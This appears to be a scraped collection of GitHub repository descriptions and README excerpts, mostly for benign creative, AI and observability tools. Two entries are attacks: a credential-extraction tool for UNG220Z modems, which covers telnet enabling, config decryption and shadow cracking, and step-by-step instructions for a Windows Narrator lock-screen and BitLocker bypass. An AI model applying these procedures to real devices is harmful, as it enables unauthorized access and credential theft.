description: AI assistant and MCP server for Blender: visual chat, scene tools, multi-agent workflows. Works with ChatGPT/GPT, Claude, Gemini, Ollama, OpenCode. Blender AI addon, copilot for 3D, bpy Python scripting, MCP integration.
readme_excerpt:
﻿# mcp-for-blender-pro

### Your Blender scene. Your AI models. One creative workspace.


**An AI assistant for Blender that can inspect your scene, build objects, edit materials, find assets and carry out multi-step workflows—with a visual chat workspace and a built-in Model Context Protocol (MCP) server.**


![Blender 4.2+](https://img.shields.io/badge/Blender-4.2%2B-E87D0D?logo=blender&logoColor=white)
![Release 1.0.0](https://img.shields.io/badge/release-1.0.0-98D85B)
![Windows x64](https://img.shields.io/badge/download-Windows_x64-357EC7)
![MIT](https://img.shields.io/badge/license-MIT-blue)


[Download](https://github.com/bookwjitchieni1986/blender-ai-mcp-addon/releases/latest) · [Getting started](docs/QUICKSTART.md) · [Connections and agents](docs/CONNECTIONS.md)


![AI chat workspace with a live Blender scene preview](docs/images/studio.png)


## Turn a creative brief into scene operations


Start with an idea. Ask the assistant to inspect your scene, create a product-display layout, arrange objects, assign materials or prepare an export. Follow its actions in the conversation and inspect the result in the viewport preview. Keep working in Blender throughout the process.


**mcp-for-blender-pro brings conversation, scene tools, model choice and agent workflows together.** It is designed for artists who want faster iteration, technical artists who automate repetitive work, and developers connecting AI tools to Blender.


## Why choose mcp-for-blender-pro?


| Capability | What it gives you |
|---|---|
| **Blender-aware assistance** | Scene and object inspection gives the assistant context before it acts. |
| **A visual Studio workspace** | Chat, scene objects, viewport snapshots, approvals and a task board in a companion window. |
| **Your choice of AI** | Connect supported cloud providers, local Ollama models or compatible custom endpoints. |
| **Saved connections** | Keep work and personal connections separate, including multiple keys for the same provider. |
| **One assistant or a team** | Use a single model for quick changes, or managers, workers and reviewers for structured tasks. |
| **Built-in MCP server** | Connect OpenCode and other clients supporting authenticated Streamable HTTP MCP. |
| **21 scene tools** | Create, inspect, edit, capture, search assets, consult Blender APIs and export scenes. |
| **Multilingual menus** | Choose English, German, French, Spanish or Chinese for the main interface. |


## From a quick edit to an agent team


Use **Single assistant** for direct, conversational work. For larger tasks, configure a **Team chain** with individual responsibilities, instructions and models.


- **Manager:** breaks the request into assignments and acceptance criteria.
- **Workers:** perform the assigned scene operations.
- **Reviewers:** inspect results and approve work or return specific findings.


Tasks run sequentially so scene edits stay ordered. A blocked task gets one correction attempt; a second failed review stops the workflow. The task board exposes assignments, attempts and review findings as work progresses.


![Agent roles and model configuration](docs/images/studio-team.png)


## Connect the models that fit your work


Supported connections include **OpenAI, Anthropic Claude, Google Gemini, OpenRouter, OpenCode Zen, Ollama and custom APIs**. Load the available model catalog and select a model directly in Blender or Studio.


Custom endpoints support OpenAI Chat Completions, Anthropic Messages and Ollama protocols. Choose models with tool-calling support; image-capable models can also interpret viewport screenshots. OpenCode-only free models are available through the OpenCode client.


![Provider, saved connection and model selection](docs/images/studio-settings.png)


## Install and create


1. Download **`mcp-for-blender-pro.zip`** from [Releases](../../releases/latest).
2. In Blender, open **Edit → Preferences → Get Extensions → menu → Install from Disk**.
3. Select the ZIP, enable **mcp

description: Sculpting, animation and simulation toolkit for pixel-art Gaussian splats
readme_excerpt:
# @shapeshift-labs/ink-studio

A JavaScript toolkit for sculpting signed-distance solids, baking them into pixel-art Gaussian splats, and making them move, react, break, grow and remember what happened to them. Use it from Node, drive it through the `ink-studio` command, or embed the source bundle in an Inkwell or browser application.

The package includes geometry, materials, lighting, animation, character controls, particles, physics, procedural generation, and retained authoring. Write scenes in JavaScript or JSON, render images through the CPU-based Node and CLI tools, or draw into a canvas with the default WebGL 2 browser renderer. Browser hosts supply the editor UI and advance the scene.

## Contents

- [Install and run](#install-and-run)
- [First sculpted scene](#first-sculpted-scene)
- [Using the library in Node](#using-the-library-in-node)
- [Scene lifecycle and splat data](#scene-lifecycle-and-splat-data)
- [Geometry and materials](#geometry-and-materials)
- [Scenes as JSON](#scenes-as-json)
- [Animation and puppets](#animation-and-puppets)
- [Particles and interaction](#particles-and-interaction)
- [Physics and persistent effects](#physics-and-persistent-effects)
- [Importing meshes](#importing-meshes)
- [Exporting GLB models](#exporting-glb-models)
- [Importing depth maps](#importing-depth-maps)
- [Procedural worlds](#procedural-worlds)
- [Retained authoring](#retained-authoring)
- [Editable 3D drawing](#editable-3d-drawing)
- [Headless world simulation](docs/headless-worlds.md)
- [Editable starter recipes](examples/starter-recipes/README.md)
- [Rendering and command reference](#rendering-and-command-reference)
- [View-dependent surface materials](#view-dependent-surface-materials)
- [Projected and procedural effects](#projected-and-procedural-effects)
- [Reflections, ripples and atmosphere](#reflections-ripples-and-atmosphere)
- [Embedding and custom scene collections](#embedding-and-custom-scene-collections)
- [Browser renderer](#browser-renderer)
- [Screen transitions](#screen-transitions)
- [Module reference](#module-reference)
- [Validation and development](#validation-and-development)

## Install and run

Requires **Node 18 or later**. There are no declared runtime dependencies. The package is available from GitHub.

From a checkout:

```sh
node cli/ink-studio.js help
node cli/ink-studio.js scenes
node cli/ink-studio.js render watcher --t 2.6
node cli/ink-studio.js render watcher --t 2.6 --colored
npm test
```

Install from GitHub:

```sh
npm install github:siliconjungle/shapeshift-labs-ink-studio
npx ink-studio help
```

To install a local checkout into another project:

```sh
npm install /absolute/path/to/ink-studio
npx ink-studio help
npx ink-studio render watcher --colored
```

The installed package is named `@shapeshift-labs/ink-studio`, and its executable is `ink-studio`. The `private` setting prevents accidental registry publication.

Generated pictures normally go into `studio/out/`. Image baselines go into `studio/snaps/`. Use `--out file.png` for an explicit output path, or configure the directories with `ink-studio.config.js`.

The examples below use `npx ink-studio` from a consuming project. In this checkout, replace that prefix with `node cli/ink-studio.js`.

## First sculpted scene

Save this as `model.js`. A JavaScript scene exports a function receiving the toolkit and returning `{ id, name, seed, build(seed) }`. `build` returns the finished world.

<!-- include: examples/sculpt.js -->

  id: 'sculpt-example',
  name: 'Carved stone',
  seed: 7,

    const palette = [0x080b10, 0x26313d, 0x566778, 0x9baeb8, 0xe5e9dc, 0x387548, 0x8fc75e];

readme_excerpt:
# antialgorithm

English | Türkçe | 简体中文 | 日本語 | 한국어 | Español | Português | Deutsch | Français | Русский

![Six posters without the skill on top, six with it below](images/showcase.png) Agent skill for creative work: names, story, game ideas, posters, UI. It makes the model name its first, most average pick, then move away from it for a reason taken from the project. Both rows came from the same prompt: `Design a poster for a music festival as a 400x600 SVG. Save the final SVG as final.svg in the current folder.` The top row is one batch of six runs without the skill, none left out. The bottom row is picked from about a dozen runs made while the skill was still being written. ![Chart of how often a choice gets picked: a tall peak around the average marked as the safe zone, flat on both sides](images/graph.png) ## Install The [skills](https://github.com/vercel-labs/skills) CLI puts it where your agent reads skills, for Codex, Cursor, OpenCode, Claude Code and others: ``` npx skills add mankidev/antialgorithm ``` Or clone it into your agent's skills folder: ``` git clone https://github.com/mankidev/antialgorithm /antialgorithm ``` In Claude Code it also installs as a plugin (on versions before 2.1.275, run `/plugin marketplace add mankidev/antialgorithm` first): ``` /plugin install antialgorithm --marketplace mankidev/antialgorithm ``` The scripts need Python 3. `check.py` also needs numpy, Pillow and `rsvg-convert` (or the cairosvg package). ## Scripts `seed.py` rolls a starting point when the request is thin. A visual seed gives a making method, colors, layout, type, a verb and a scale for the idea, a setting, a region and, half the time, an object. A text seed gives a voice, a way in and a register. An idea seed gives a verb, a constraint, a scale and a pressure. It draws from system randomness, so two people sending the same prompt start in different places. It also saves each seed to `~/.local/state/antialgorithm/history.jsonl` (under `$XDG_STATE_HOME` when that is set) and skips values from the last few, so your own seeds don't repeat from one session to the next. Plugin updates leave that file alone. `--keep "axis=value"` holds an axis fixed, which lets you keep a subject and roll only the look. `moves.py` keeps a short log of the main move behind each off-default answer, such as "neon tube wall, almost no type". The model reads it before showing new work, so it doesn't reuse a move that worked last time just because it worked. `rough.py` takes an SVG and shakes its straight lines, shapes and letters, and breaks the even spacing of repeated marks, so a hand-made look drawn in code stops looking plotted. It is only for hand-made methods such as print, paint, stamps and ink; screen, camera and render looks keep their own marks. `check.py` renders an SVG at full size and at icon size and lists text that runs off an edge, sits under a shape, has low contrast or is too small. description: ung220z-tool 是一个针对 UNG220Z（九联/Unionman 中国移动光猫）的一键凭据提取工具，仅限在你自己的设备上用于找回忘记的管理密码、迁移宽带配置或安全自查。
readme_excerpt:
# ung220z-tool

针对 **UNG220Z（九联 / Unionman 中国移动光猫）** 的一键凭据提取工具。

> ⚠️ 仅用于**你自己的设备**，用于找回自己忘记的管理密码、迁移宽带配置或安全自查。
> 未经授权对他人设备使用属于违法行为，作者不承担任何责任。

## 背景

这类光猫的 Web 管理页基于 `.gch` CGI 框架，登录口令由 TR-069 定期轮换，普通用户拿到的密码往往几天就失效。本工具走 Telnet 通道，直接读取设备配置库，拿到**当下有效**的全部凭据。

## 工作流程

```
用户输入账号密码
   ↓
拼出 http://<ip>/usr=<user>&psw=<pass>&cmd=1&telnet.gch 并打开浏览器（同时脚本直连兜底）
   ↓
Telnet 登录 → root shell
   ↓
sidbg 1 DB decry /userconfig/cfg/db_user_cfg.xml 解密配置
   ↓
提取 Web 账号 / Telnet 口令 / PPPoE / WiFi 密钥 / root 口令
   ↓
打印凭据表 + 落盘日志
```

## 用法

```bash
python3 ung220z.py
```

会依次询问：

```
※ 用户名和密码通常印在光猫【背面贴纸】上（S/N 标签）
  形如「用户名：user   密码：xxxxxxxx」，把光猫翻过来就能看到

① 光猫地址 [192.168.1.1]:
② 用户名 [user]:
③ 密码（输入时不显示）
   密码:
```

也可以全部走命令行：

```bash
python3 ung220z.py -i 192.168.1.1 -u user -p '你的密码'
python3 ung220z.py -i 192.168.1.1 -u user -p '你的密码' --no-browser
```

### 常用参数

| 参数 | 说明 |
|---|---|
| `-i, --ip` | 光猫地址，默认 `192.168.1.1` |
| `-u, --user` | 登录用户名，默认 `user` |
| `-p, --password` | 登录密码，不填则交互输入 |
| `--telnet-user` | Telnet 用户名，默认 `CMCCAdmin` |
| `--telnet-password` | Telnet 口令（部分机型与 Web 口令不同） |
| `--no-browser` | 不调用浏览器，纯 HTTP 请求 |
| `--unlock` | Web 被会话锁占住时重启 httpd 解锁 |
| `--no-release` | 不尝试释放残留 Web 会话 |

## 输出示例

```
[22:15:00] INFO   会话开始  目标=192.168.1.1  账户=user
[22:15:00] HTTP   已发送给浏览器: http://192.168.1.1/usr=user&psw=***&cmd=1&telnet.gch
[22:15:00] HTTP   telnet.gch → TelnetSet Success!
[22:15:00] PROBE  nc -zv 192.168.1.1 23 → succeeded
[22:15:01] AUTH   Telnet CMCCAdmin / ****** → 登录成功（root）
[22:15:02] SHELL  sidbg 1 DB decry /userconfig/cfg/db_user_cfg.xml → /tmp/debug-decry-cfg
[22:15:03] DATA   DevAuthInfo  CMCCAdmin  / ******  Level=1
[22:15:04] CRACK  MATCH: ******  (/etc/shadow)
```

最后输出凭据汇总表，并写入 `ung220z_<时间戳>.log`。

## 依赖

- Python 3.8+
- 标准库即可，无需 pip 安装
- 设备已开启 Telnet（脚本会自动通过 `telnet.gch` 尝试开启）

## 原理说明

| 环节 | 说明 |
|---|---|
| 开 Telnet | `GET /usr=<user>&psw=<pass>&cmd=1&telnet.gch`，返回 `TelnetSet Success!` 即成功 |
| Web 登录 | 密码前端只做 base64，`Frm_Logintoken` 每次响应递增，必须回填实时值 |
| 配置解密 | `sidbg 1 DB decry` 无口令即可解密，得到明文 XML |
| root 口令 | `/etc/shadow` 中为 SHA-256 crypt，工具会用常见出厂口令比对 |

## 免责声明

本项目仅用于教育与自有设备维护。使用者应确保对目标设备拥有合法管理权限。

description: Steer ideas like a space pilot!
readme_excerpt:
# 🕹️ Spaceship IDE

Steer ideas like a space pilot!

![Screencast](./extra/screencast.gif)

## Demos

Watch on [Instagram](https://www.instagram.com/reels/DfyQPhFtW-z/) and [YouTube](https://www.youtube.com/watch?v=3WmNLWUmcnY). You can try the simulator at [https://chuanqisun.github.io/spaceship/](https://chuanqisun.github.io/spaceship/) with the option to go live with your API keys for Cerebras and Gemini. Keys stay in your browser local storage. Do it at your own risk.

## Conjecture

> In the near future, LLM and Decision Models will reach 60 FPS interactivity.

When that happens, what new interaction paradigms will unlock? This project demonstrates plausible and desirable interactions for that future.

1. **Focus monitor**: can we visualize what LLM is paying attention to, and use that to guide human's focus towards what's important?

   ![focus monitor](./extra/clips/focus-monitor.gif)

2. **Attention lock**: can we force LLM to pay more attention to specific phrases so as to bias its future behavior?

   ![attention lock](./extra/clips/attention-lock.gif)

3. **Future Vector Steering**: can we decompose the task into eigenvectors, independently tune each, and re-compose them to influence the incoming text?

   ![future steering](./extra/clips/future-steering.gif)

4. **Realtime re-generation**: when text generation is cheap and fast, can we explore alternative futures by scrubbing?

   ![realtime regeneration](./extra/clips/realtime-regeneration.gif)

## Design process

I used Claude Code for most of the implementation but stayed hands-on for the UI/UX. I iterate using interactive style swatch, a technique where I prompt AI to give me diverse options of designs, I provide feedback, and it iterates. You can see the design artifacts in the [extra page](https://chuanqisun.github.io/spaceship/extra/style-1.html).

To achieve the realtime experience, I have to use agreesive speculative generation and manage cache invalidation based on user interactions. For example, when the main knob moves backward, I have to empty future texts and cancel ongoing requests. There are many considerations like this throughout the system and that took a lot of human judgement - claude didn't one shot them.

## Theory

I'm currently focusing on systems that help human shape ideas in realtime. This project is a small step towards my [upcoming thesis](https://code.chuanqisun.com/master-thesis/) at the MIT Media Lab, where I investigate how semantic and symoblic systems can be coupled to enhance human creativity, agency, and joy of craft.

## Community

This repo can be the conceptual launchpad for new designs and applications. Here is what the community has built. Open a PR to add yours!

- [Spaceship Writer](https://marketplace.visualstudio.com/items?itemName=brentlee-personal.spaceship-writer), a VSCode Extension by [brentlee](https://github.com/brentlee-personal), an independent adaptation of Chuanqi Sun’s Future Vector Steering design ([Source](https://github.com/brentlee-personal/spaceship-vscode) · [Demo in VS Code on Linux](https://github.com/brentlee-personal/spaceship-vscode/releases/download/v0.3.0/spaceship-writer-0.3.0-linux.mp4))
- [Spaceship Lime](https://spaceship-lime.vercel.app), steer local models in browser, by [Philippe](https://github.com/philippe-page)
- [Story Pilot](https://beyondchat.design/lab/story-pilot/), design pattern distilled by [Dominik](https://www.linkedin.com/in/dominikwitzke/)

## Citation

If you build on this work, please cite it as:

```bibtex
@misc{sun2026spaceship,
  author       = {Sun, Chuanqi},
  title        = {Spaceship {IDE}: Steer Your Ideas in Realtime, Space Pilot Style},
  year         = {2026},
  publisher    = {GitHub},
  howpublished = {\url{https://github.com/chuanqisun/spaceship}},
  note         = {Demo: \url{https://chuanqisun.github.io/spaceship/}}
}
```

description: A 4.5M-parameter two-voice English text-to-speech model, trained from scratch
readme_excerpt:
# tiny-voca

tiny-voca is a small English text-to-speech model. It has two voices, 4.5M
parameters, and runs on a CPU or in the browser.

[Demo](https://tiny-voca.n4ze3m.com) · [Weights](https://huggingface.co/n4ze3m/tiny-voca) · [Dataset](https://huggingface.co/datasets/n4ze3m/tiny-voca)

## Features

- **Small**: 4,537,291 parameters, 18 MB, waveform generator included.
- **Fast**: about 70x real time on four CPU threads.
- **Two voices**: F2 (female) and M2 (male), American English, 24 kHz.
- **Runs anywhere**: PyTorch, ONNX Runtime, and ONNX Runtime Web.
- **Open**: code, weights, training recipe and dataset. Trained from scratch.

## Install

```bash
git clone https://github.com/n4ze3m/tiny-voca.git
cd tiny-voca
pip install -e ".[own]"
hf download n4ze3m/tiny-voca --local-dir weights
export DIZIONE_DATA=weights/phonemizer
```

## Usage

```bash
python -m tiny_voca.infer \
  --checkpoint weights/tiny-voca.pt \
  --voice F2 \
  --text "Hello! This is tiny voca." \
  --output hello.wav
```

| Option | Default | Meaning |
|---|---|---|
| `--text-file` | | Read the text from a file instead of `--text` |
| `--voice` | `F2` | `F2` or `M2` |
| `--speed` | 1.0 | Speaking rate |
| `--pitch-shift` | 0 | Raise or lower the pitch |
| `--pitch-range` | 1.0 | More or less pitch movement |

Long text is fine. It is read one sentence at a time and the audio is joined.
A text that ends without a mark gets a full stop, so the last word does not
break off. A sentence with nothing to read, such as one in another script, is
skipped. The output never peaks above 0.99, so it does not clip as a 16-bit
WAV. In Python, `tiny_voca.infer.speak_text` does the same.

## ONNX

```bash
python -m tiny_voca.export --checkpoint weights/tiny-voca.pt --output tiny-voca.onnx
```

A ready file is in the weights repository as `onnx/model.onnx`. The
[model card](https://huggingface.co/n4ze3m/tiny-voca) shows how to call it.

## Web demo

The [demo](https://tiny-voca.n4ze3m.com) runs the model in the browser. It
plays each sentence as soon as it is made, and keeps the whole clip in the
player. Its source is in `web/`.

```bash
cd web
bash fetch_assets.sh /path/to/dizione
npx wrangler dev
```

## Plain JavaScript

An experiment in `js/`: the model and the phonemizer in plain scripts, with no
libraries. It reads one 8 MB file and runs in the browser, in Node and in Bun.

```bash
node js/say.mjs "Hello! This is tiny voca." --voice M2 --output hello.wav
```

See [js/README.md](js/README.md).

## Training

```bash
export TINY_VOCA_FRONTEND=own
python -m tiny_voca.prepare --inputs data/train-*.parquet --split train --output features
python -m tiny_voca.annotate --features features --output annotations
python -m tiny_voca.train --train annotations/train.jsonl --validation annotations/validation.jsonl \
  --output runs/NAME --steps 104000 --gan-start 8000 --gan-ratio 0.7 --teacher-final 0
python -m tiny_voca.evaluate --checkpoint runs/NAME/inference.pt --annotations annotations --output eval/NAME
```

The released weights took 7.7 hours on one RTX 4090. More about the model and
the data is in [docs/model.md](docs/model.md).

## Tests

```bash
PYTHONPATH=src:tests python -m unittest discover -s tests
```

## Limits

- English only. Two fixed voices. No voice cloning.
- The F2 voice sounds younger than intended. A more mature voice is planned.
- Foreign names and odd spellings are often read wrong.
- No streaming yet.

## Community

Built by other people on top of tiny-voca.

Languages and voices:

- [apptor-tiny-tts](https://huggingface.co/apptor/apptor-tiny-tts): German.
- [apptor-tiny-tts-at](https://huggingface.co/apptor/apptor-tiny-tts-at): Austrian German, with an accent you can turn up or down and a [browser demo](https://tiny-tts.apptor.at).
- [tiny-voca-de-en](https://huggingface.co/Fraunhofer-IEM/tiny-voca-de-en): German and English, with up to 32 voices in each.
- [tiny-voca-it](https://github.com/carbogninalberto/tiny-voca-it): Italian.

description: FastUnlock : Windows Narrator LockScreen Bypass 0day Vulnerability
readme_excerpt: # FastUnlock FastUnlock : Windows Narrator LockScreen Bypass 0day Vulnerability [![FastUnlock](https://i3.ytimg.com/vi/6BKsdUtc6bg/hqdefault.jpg)](https://www.youtube.com/watch?v=6BKsdUtc6bg) The vulnerability exist in the way how narrator handles UI in a locked account context, succesful exploitation results in bypassing bitlocker and executing code in the context of the lockscreen account "WsiAccount" It took a total of 5 minutes from finding this to breaching a fully encrypted bitlocker machine with Windows 11 26H2 November Patch installed, an issue caused by total negligence from Microsoft's side... The vulnerability seems to be extremely consistent in every machine I tested it in, in other words, if you know how to control narrator in the background properly or just press the correct combination of buttons, you will get code execution in the target machine as well. Obviously this needs physical access and at least one account in the machine to be linked to an online account, this breaks the guarantee that a properly secured bitlocker machine cannot be accessed even if the attacker has physical access so hold tight any windows machines until Microsoft patches this. In the process of giving narrator a new look, Microsoft forgot to make sure that the new UI does not run in the case it was running in the context of a lockscreen user (interestingly it still has the old code that prevents it from spawning the window if it's running as SYSTEM) Unlike the previous lockscreen bypass bugs I found in the past (by example ZDI-21-1053), this one is extremely convenient to use, when you click "I forgot my PIN" (or password or whatever), As soon as you the Microsoft account window prompts you for an action to reset the account, press Win+U and click on narrator, The second you enable narrator it will immediately focus on a background window owned by narrator, this exact window will be in the background but you would not be able to see it As you can see narrator is focused on the "Next" button, to navigate hold the caps key (Do not release) and use arrow keys to navigate, your next objective is obvious, click on the "Math reading settings", in order to click the actual link, you can press CAPS + Enter, this will take you to the next step, the settings window From now, it's just up to you how you want to to execute code, having focus on settings window allows multiple ways to get code execution in the context of the "WsiAccount" user. For me I prefer navigating to "Bluetooth & Devices" then going for "AutoPlay" then "Removable Drive" and finally "Open folder to view files (File Explorer)" As respectively shown in the demo video, Now I didn't show the full code execution demo because I don't really have a USB stick but I already did this enough times to know what happens next, your next step is to plugin a USB stick, as soon as you do, narrator will focus on explorer showing your mounted storage content and you can just navigate with the same button combination (CAPS LOCK + Arrow keys/Enter/Space), if you do everything properly the binary in your USB stick will be e

description: Self-hosted observability: metrics, logs, traces, dashboards and alerts. Stores data in PostgreSQL or ClickHouse. Accepts OpenTelemetry data.
readme_excerpt:
# DataCat

Self-hosted observability: metrics, logs, distributed traces, dashboards, infrastructure
and alerts in one place. DataCat runs on your infrastructure, stores data in PostgreSQL (or telemetry in
ClickHouse, if you choose; see docs/SELF_HOSTING.md), and accepts OpenTelemetry and Datadog-compatible agent traffic.
No hosted account or external service is required.

## Features

- Metrics explorer, formulas, dashboards and host maps
- Searchable logs with facets, live tail and trace correlation
- APM service catalog, trace explorer and waterfall
- Metric, log and trace monitors with webhook/Slack notifications
- Organizations, local accounts, single-use invites, API/application keys
- OpenTelemetry Collector-based host agent and Node.js/Python instrumentation libraries
- One production process serving the API, web UI, installer and downloads

![DataCat dashboard](docs/images/dashboard.jpg)

## Quick start with Docker Compose

Requirements: Docker Engine with the Compose plugin, Git, and OpenSSL.

```sh
git clone https://github.com/replit/datacat
cd datacat
cp .env.example .env
sed -i "s/^POSTGRES_PASSWORD=.*/POSTGRES_PASSWORD=$(openssl rand -hex 24)/" .env
sed -i "s/^SESSION_SECRET=.*/SESSION_SECRET=$(openssl rand -hex 32)/" .env
chmod 600 .env
mkdir -p downloads
docker compose up -d --build
```

Open **http://localhost:3000**, create your admin account and organization, then create
an API key under **Organization Settings**. Setup asks for a setup token, printed in the
server log (`docker compose logs datacat | grep "setup token"`) unless you set `DATACAT_SETUP_TOKEN`.
Set `PUBLIC_URL` to your externally reachable HTTPS origin before inviting colleagues or
installing agents remotely.

Agent binaries and SDK packages are separate release assets. Put them (including
`SHA256SUMS`) in `downloads/` to serve them from your instance.

## Sending data

DataCat accepts the Datadog public intake API and OTLP/HTTP:

| Sender | Status |
| --- | --- |
| Datadog Agent 7.56.2 (metrics, logs, check runs, traces) | Tested in CI-style runs |
| Datadog Agent 7.85.4 (metrics, logs, check runs, traces) | Tested with captured payloads; including the newer string-table trace format |
| Datadog Agent 7.57–7.84 | Not tested individually. Agents that send traces in a format DataCat cannot read get a 422, never a silent 202 |
| OpenTelemetry Collector / SDKs (OTLP/HTTP) | `/v1/traces`, `/v1/metrics`, `/v1/logs` (also under `/otlp/v1/*`) |
| DataCat Agent and libraries | Tested in CI |

`GET /api/v1/intake/stats` shows, per intake path, how many items were stored and how many were dropped since the
server started.

Sign-in uses local email/password accounts; members join through single-use invite links.

## From source

Use Node.js **22.15+**, pnpm **10.11.0** and PostgreSQL **14+**. Node 22 also meets
the Node SDK requirement; older Node 20 releases are not supported by the current SDK.

```sh
corepack enable
corepack prepare pnpm@10.11.0 --activate
pnpm install --frozen-lockfile
BASE_PATH=/ pnpm run build:selfhost
# Set DATABASE_URL, SESSION_SECRET and PUBLIC_URL in your environment.
NODE_ENV=production PORT=3000 pnpm start
```

The server migrates its schema automatically before listening. There is no manual
schema push and no separate frontend server.

See **[Self-hosting](docs/SELF_HOSTING.md)** for clean Ubuntu installation, all environment
settings, backups, systemd, agent installation, Node/Python instrumentation and a
webhook monitor walkthrough.

## Development

```sh
pnpm run typecheck:libs
pnpm --filter @workspace/api-server run dev
# In another terminal:
API_PROXY=http://localhost:3000 PORT=5173 pnpm --filter @workspace/web run dev
```

The API needs `DATABASE_URL`; use a separate development database.
The agent is built with Go 1.26.11+:

```sh
bash agent/build.sh
DESTDIR="$PWD/dist/downloads" bash agent/release.sh
```

Tests:

```sh
pnpm --filter @workspace/api-server test     # server unit tests
DATACAT_URL=http://localhost:3000 DA

description: Skill to draw stick figure animated visuals
readme_excerpt:
# /stick-scene Skill to make your agent draw little stick-figure scenes that show what your product does. Each scene is one `` with no dependencies. It idles quietly, breathing and glancing around, and plays a short action when it scrolls into view, on click or on hover. ## Make a scene Install the skill ```bash npx skills add nilbuild/stick-scene ``` Then ask your agent ```bash /stick-scene [what you want to show] /stick-scene a scene for the hero of this landing page /stick-scene show that our CLI turns a YAML file into JSON /stick-scene one scene for each feature section on the homepage /stick-scene show an agent fixing the comments I leave on a diff ``` It reads your project, pitches two or three ideas for you to pick from, writes the scene, renders it frame by frame to check that nothing overlaps or gets cut off, and adds it to your page. ## Ask for changes If something looks off, say what is wrong e.g. - "the note covers his face", "the bubble runs off the edge" - "make the robot think for a moment before it starts" - "slower", "loop it", "only play it on click" - "use our brand green", "add a second agent in teal" - "light up the steps on the page as it plays" ## Examples Every scene below is in [`examples/`](examples).

Review: comment on a line, the agent fixes it, you approve
Database: pull the lever and a database rises

Converter: feed YAML in, turn the crank, JSON pops out
CI: push a commit down the workflow

Login: log in once and a cookie opens the door
Email: one click and the letters fly out

Models: a spotlight picks the model, a knob sets the effort
Reports: the bill prints and goes into Slack

Queue: issues line up and the agent works through them overnight
Recording: the camera operator films the app

Highlights: mark a line, copy the link, it opens highlighted
Messages: stomp on enter and it lands in Slack
## Use a scene Copy `runtime/stick.js` and your scene into the site's static folder and add ```html ``` | Attribute | | | --- | --- | | `scene` | the id the scene registers | | `play` | `view` plays once when it scrolls into view, then on click. Also `click`, `hover`, `loop` and `idle` | | `no-floor` | drop the grey band under the ground line, for plain white pages | | `no-ground` | drop the ground line too | | `zoom` | scale the drawing inside the box, default `1` | | `label` | what a screen reader hears, defaults to the scene's own sentence | Size it with CSS. Scenes off screen don't draw, and with reduced motion on, a scene shows one still frame and never plays. ## License MIT © [Kamran Ahmed](https://kamran.fyi).
